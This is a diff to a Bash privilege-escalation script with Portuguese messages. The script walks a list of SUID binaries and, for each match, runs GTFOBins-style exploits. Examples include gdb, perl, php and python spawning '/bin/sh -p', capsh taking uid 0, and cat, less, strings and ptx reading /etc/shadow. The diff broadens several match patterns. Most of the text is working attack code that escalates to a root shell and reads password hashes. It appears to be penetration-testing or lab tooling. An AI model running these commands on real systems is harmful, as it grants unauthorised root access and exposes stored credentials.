@@ -12,7 +12,7 @@ echo -e "\e[0m"
 
 echo -e "\e[1;35m"
 echo "[*] ----------------- SUID ----------------"
-echo "[*]         Procurando binários SUID       "
+echo "[*] Procurando binários SUID do GTFOBins..."
 echo "[*] ---------------------------------------"
 echo -e "\e[0m"
 
@@ -134,7 +134,7 @@ for path in $SUIDS; do
             echo "[+] $path → capsh SUID encontrado! Teste:"
             "$path" --gid=0 --uid=0 --
             ;;
-        cat|column|eqn|expand|hd|less|links|more|paste|pg|soelim|strings|tbl|troff|ul|uniq|xmore|zsoelim|x86_64-linux-gnu-strings)
+        cat|column|eqn|expand|hd|less|links|more|paste|pg|soelim|strings|tbl|troff|ul|uniq|xmore|zsoelim)
             echo "[+] $path → SUID encontrado! Teste:"
             "$path" /etc/shadow
             ;;
@@ -296,7 +296,7 @@ for path in $SUIDS; do
             echo "Busque um processo rodando como root para usar"
             echo ""$path" $PID"
             ;;
-        gdb)
+        *gdb*)
             echo "[+] $path → gdb SUID encontrado! Teste:"
             "$path" -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
             ;;
@@ -496,11 +496,11 @@ for path in $SUIDS; do
             echo "[+] $path → perf SUID encontrado! Teste:"
             "$path" stat /bin/sh -p
             ;;
-        perl)
+        perl|*perl*)
             echo "[+] $path → perl SUID encontrado! Teste:"
             "$path" -e 'exec "/bin/sh";'
             ;;
-        php)
+        php|*php*)
             echo "[+] $path → php SUID encontrado! Teste:"
             CMD="/bin/sh"
             "$path" -r "pcntl_exec('/bin/sh', ['-p']);"
@@ -518,7 +518,7 @@ for path in $SUIDS; do
             echo "[+] $path → ptx SUID encontrado! Teste:"
             "$path" -w 5000 /etc/shadow
             ;;
-        python | python3)
+        python3|*python*)
             echo "[+] $path → python SUID encontrado! Teste:"
             "$path" -c 'import os; os.execl("/bin/sh", "sh", "-p")'
             ;;
